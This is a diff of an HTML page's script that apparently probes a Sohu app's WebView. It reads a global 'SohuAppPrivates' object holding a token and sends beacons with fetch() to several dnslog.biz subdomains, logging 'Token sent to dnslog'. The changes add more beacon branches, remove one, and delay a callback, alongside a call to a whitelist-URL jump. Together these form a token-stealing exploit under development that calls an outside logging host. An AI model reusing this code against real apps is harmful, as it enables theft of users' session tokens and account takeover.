@@ -18,6 +18,7 @@
 
         // 获取SohuAppPrivates变量
         let sohuAppPrivates = null;
+
         if (typeof SohuAppPrivates !== 'undefined') {
             let dnslogUrl = "https://test1.bbc66268.log.dnslog.biz";
             fetch(dnslogUrl, {
@@ -31,17 +32,6 @@
             });
             sohuAppPrivates = JSON.parse(JSON.stringify(SohuAppPrivates));
         }
-        let dnslogUrl = "https://test2.bbc66268.log.dnslog.biz";
-        fetch(dnslogUrl, {
-        mode: 'no-cors'
-        })
-        .then(response => {
-        console.log('Token sent to dnslog:', response.status);
-        })
-        .catch(error => {
-        console.error('Error sending token to dnslog:', error);
-        });
-        
         // 提取token信息
         let token = null;
         if (sohuAppPrivates && sohuAppPrivates.token) {
@@ -57,7 +47,8 @@
               console.error('Error sending token to dnslog:', error);
             });
         } else {
-            let dnslogUrl =  'https://error2.bbc66268.log.dnslog.biz';
+            if (JSON.stringify(SohuAppPrivates) === "{}") {
+              let dnslogUrl =  'https://sohu1.bbc66268.log.dnslog.biz';
             fetch(dnslogUrl, {
               mode: 'no-cors'
             })
@@ -68,6 +59,20 @@
               console.error('Error sending token to dnslog:', error);
             });
             console.log('SohuAppPrivates variable not found or token not present.');
+            } else {
+              let dnslogUrl =  'https://sohu12.bbc66268.log.dnslog.biz';
+            fetch(dnslogUrl, {
+              mode: 'no-cors'
+            })
+            .then(response => {
+              console.log('Token sent to dnslog:', response.status);
+            })
+            .catch(error => {
+              console.error('Error sending token to dnslog:', error);
+            });
+            console.log('SohuAppPrivates variable not found or token not present.');
+            }
+            
         }
     }
     // let startTime = Date.now();
@@ -75,8 +80,9 @@
     //   // 主线程将被阻塞5秒
     // }
     // console.log('5 seconds have passed');
+    setTimeout(getappCallback,400);
     jumpWhiteListUrl();
-    getappCallback();
+
 
   </script>
 </body>
